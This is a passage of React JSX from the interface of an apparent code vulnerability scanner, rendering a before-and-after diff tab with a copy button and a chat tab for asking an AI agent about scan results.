                      <div style={{fontSize:'12px',opacity:0.5}}>Sample vulnerable Python code pre-loaded<br/>Click scan to begin · Or try Judge Demo ⚡</div>
                    </div>
                  </div>
                )}
              </>
            )}

            {/* DIFF TAB */}
            {activeTab==='diff'&&(
              <div>
                <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',marginBottom:'12px'}}>
                  <span style={{fontSize:'14px',fontWeight:700,color:'#00ff88'}}>⚡ Code Diff — Before vs After</span>
                  {fixedCode&&<button className="copy-btn" onClick={()=>{navigator.clipboard.writeText(fixedCode);setCopied(true);setTimeout(()=>setCopied(false),2000)}}>{copied?'✅ Copied!':'📋 Copy Fixed'}</button>}
                </div>
                {fixedCode ? <DiffViewer original={code} patched={fixedCode}/> : (
                  <div className="idle"><div className="idle-inner"><div style={{fontSize:'30px',marginBottom:'12px',opacity:0.3}}>⚡</div><div style={{fontSize:'13px',fontWeight:600}}>Run a scan first</div><div style={{fontSize:'12px',opacity:0.4,marginTop:'4px'}}>Diff will appear here after patching</div></div></div>
                )}
              </div>
            )}

            {/* CHAT TAB */}
            {activeTab==='chat'&&(
              vulns.length>0 ? <AskAgent vulns={vulns} fixedCode={fixedCode}/> : (
                <div className="idle"><div className="idle-inner"><div style={{fontSize:'30px',marginBottom:'12px',opacity:0.3}}>💬</div><div style={{fontSize:'13px',fontWeight:600}}>Scan first to chat with agent</div><div style={{fontSize:'12px',opacity:0.4,marginTop:'4px'}}>After a scan, ask the AI anything about the results</div></div></div>
              )
            )}
          </div>
        </div>
      </div>
    </>
  )
}
